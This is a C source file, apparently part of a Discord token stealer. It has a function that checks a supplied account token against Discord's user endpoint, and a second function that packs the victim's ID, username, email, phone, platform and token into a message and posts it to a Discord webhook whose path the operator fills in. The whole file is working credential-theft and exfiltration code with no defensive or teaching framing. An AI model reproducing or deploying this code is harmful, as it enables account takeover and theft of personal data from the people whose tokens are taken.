#include "sock.h"

char* getBody(const char* response)
{
    int jsonStart = 0;
    int jsonEnd = 0;
    for (int i = 0; response[i] != '\0'; ++i)
    {
        if (response[i] == '{')
        {
            jsonStart = i;
            break;
        }
    }
    for (int i = 0; response[i] != '\0'; ++i)
    {
        if (response[i] == '}')
        {
            jsonEnd = i;
            break;
        }
    }

    if (jsonStart != 0 && jsonEnd != 0)
    {
        size_t jsonLength = jsonEnd - jsonStart + 1;
        char* json = (char*)malloc(jsonLength);

        if (json == NULL)
        {
            fprintf(stderr, "Memory allocation failed\n");
            return NULL;
        }

        for (int i = 0; i < jsonLength; i++)
        {
            json[i] = response[jsonStart + i];
        }

        return json;
    }
    return NULL;
}

int validTkn(const char* tkn, char** jsonResult) {

    //const char* tkn = "e";

    WSADATA wsaData;
    SSL_CTX* sslContext = NULL;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return -1;
    }

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    sslContext = SSL_CTX_new(TLS_client_method());


    size_t httpRequestLength = strlen("GET /api/v9/users/@me HTTP/1.1\r\n"
        "Host: discord.com\r\n"
        "Content-Type: application/json\r\n"
        "Authorization: \r\n"
        "Connection: close\r\n"
        "\r\n") + strlen(tkn) + 10;

    char* httpRequest = (char*)malloc(httpRequestLength);
    if (httpRequest == NULL)
    {
        printf("Error: Malloc");
        exit(1);
    }

    snprintf(httpRequest, httpRequestLength, "GET /api/v9/users/@me HTTP/1.1\r\n"
        "Host: discord.com\r\n"
        "Content-Type: application/json\r\n"
        "Authorization: %s\r\n"
        "Connection: close\r\n"
        "\r\n", tkn
    );

    SOCKET socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (socketClient == INVALID_SOCKET)
    {
        printf("Failed to create socket.\n");
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    //int millisec = 5000; // 1 second
    //setsockopt(socketClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&millisec, sizeof(int));

    struct addrinfo* result = NULL;
    if (getaddrinfo("discord.com", "https", NULL, &result) != 0)
    {
        printf("Failed to resolve hostname.\n");
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = ((struct sockaddr_in*)result->ai_addr)->sin_addr.s_addr;
    serverAddr.sin_port = htons(443);

    freeaddrinfo(result);

    if (connect(socketClient, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Failed to connect to server.\n");
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    SSL* ssl = SSL_new(sslContext);
    SSL_set_fd(ssl, socketClient);
    SSL_set_timeout(ssl, 5);
    

    if (SSL_connect(ssl) != 1) {
        printf("SSL handshake failed.\n");
        SSL_free(ssl);
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    if (SSL_write(ssl, httpRequest, strlen(httpRequest)) <= 0) {
        printf("Failed to send HTTP request.\n");
        SSL_free(ssl);
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    //char buffer[4096];
    int bytesRead = 0;
    int totalBytesRead = 0;
    int statusCode = 0;
    char* json = NULL;
    char* buffer = NULL;

    while (1)
    {
        char chunk[1024];
        bytesRead = SSL_read(ssl, chunk, sizeof(chunk));
        if (bytesRead > 0)
        {
            buffer = realloc(buffer, totalBytesRead + bytesRead);
            if (buffer == NULL)
            {
                fprintf(stderr, "Memory allocation failed\n");
                return -1;
            }
            memcpy(buffer + totalBytesRead, chunk, bytesRead);
            totalBytesRead += bytesRead;
        }
        else {
            break;
        }
    }
    
    if (buffer == NULL)
    {
        fprintf(stderr, "Error: buffer");
        return -1;
    }

    //printf("%s\n", buffer);
    sscanf_s(buffer, "HTTP/1.%*d %d", &statusCode);

    //fwrite(buffer, 1,totalBytesRead, stdout);

    const char* delimiter = "\r\n\r\n";
    const char* body = strstr(buffer, delimiter);
    
    while (body != NULL && statusCode == 200) {

        json = getBody(body);
        if (json != NULL) {
            *jsonResult = json;
        }

        body = strstr(body + strlen(delimiter), delimiter);
    }
    
    free(buffer);

    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(socketClient);
    WSACleanup();
    free(httpRequest);

    if (statusCode == 200)
    {
        return 1;
    }
    *jsonResult = NULL;
    free(json);
    return 0;
}

int sendData(UserData userInfo) {
    WSADATA wsaData;
    SSL_CTX* sslContext = NULL;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return -1;
    }
    
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    sslContext = SSL_CTX_new(TLS_client_method());

    //const char* webhookUrl = "xxx";

    //const char* jsonData = "{\"content\": \"testtt\"}";

    //size_t contentLength = strlen(userInfo.id) + strlen(userInfo.tkn) + 
    //    strlen(userInfo.email) + strlen(userInfo.phone) + strlen(userInfo.username) + strlen(userInfo.platform) + 31;
    size_t contentLength = strlen(userInfo.id) + strlen(userInfo.tkn) +
            strlen(userInfo.email) + strlen(userInfo.phone) + strlen(userInfo.username) + strlen(userInfo.platform) + 80;

    char* jsonData = (char*)malloc(contentLength + 1);

    if (jsonData == NULL)
    {
        fprintf(stderr, "Error: Memory allocation\n");
        return -1;
    }

    //snprintf(jsonData, contentLength + 1, "{\"content\": \"```%s\n%s\n%s\n%s\n%s\n%s```\"}", userInfo.id, userInfo.username, userInfo.email, userInfo.phone, userInfo.platform, userInfo.tkn);
    snprintf(jsonData, contentLength + 1, "{\"content\": \"```ID: %s\\nName: %s\\nEmail: %s\\nPhone: %s\\nPlatform: %s\\nToken: %s```\"}", userInfo.id, userInfo.username, userInfo.email, userInfo.phone, userInfo.platform, userInfo.tkn);

    size_t httpRequestLength = strlen("POST /api/webhooks/CHOOSE/CHOOSE HTTP/1.1\r\n"
        "Host: discord.com\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: \r\n"
        "Connection: close\r\n"
        "\r\n") + contentLength + 10;

    char* httpRequest = (char*)malloc(httpRequestLength);
    if (httpRequest == NULL)
    {
        printf("Error: Malloc");
        free(jsonData);
        return -1;
    }

    snprintf(httpRequest, httpRequestLength, "POST /api/webhooks/REDACTED/REDACTED(u choose) HTTP/1.1\r\n"
        "Host: discord.com\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n%s", strlen(jsonData), jsonData
    );


    free(jsonData);

    SOCKET socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socketClient == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        WSACleanup();
        return -1;
    }

    struct addrinfo* result = NULL;
    if (getaddrinfo("discord.com", "https", NULL, &result) != 0) {
        printf("Failed to resolve hostname.\n");
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = ((struct sockaddr_in*)result->ai_addr)->sin_addr.s_addr;
    serverAddr.sin_port = htons(443);

    freeaddrinfo(result);

    if (connect(socketClient, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Failed to connect to server.\n");
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    SSL* ssl = SSL_new(sslContext);
    SSL_set_fd(ssl, socketClient);

    if (SSL_connect(ssl) != 1) {
        printf("SSL handshake failed.\n");
        SSL_free(ssl);
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    if (SSL_write(ssl, httpRequest, strlen(httpRequest)) <= 0) {
        printf("Failed to send HTTP request.\n");
        SSL_free(ssl);
        closesocket(socketClient);
        WSACleanup();
        return -1;
    }

    char buffer[4096];
    int bytesRead;
    int totalReceived = 0;
    int statusCode = 0;

    while (1) {
        bytesRead = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (bytesRead > 0) {
            buffer[bytesRead] = '\0';
            totalReceived += bytesRead;
            //printf("%s\n", buffer);

        }
        else {
            break;
        }
    } 

    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(socketClient);
    WSACleanup();
    free(httpRequest);

    return 1;
}
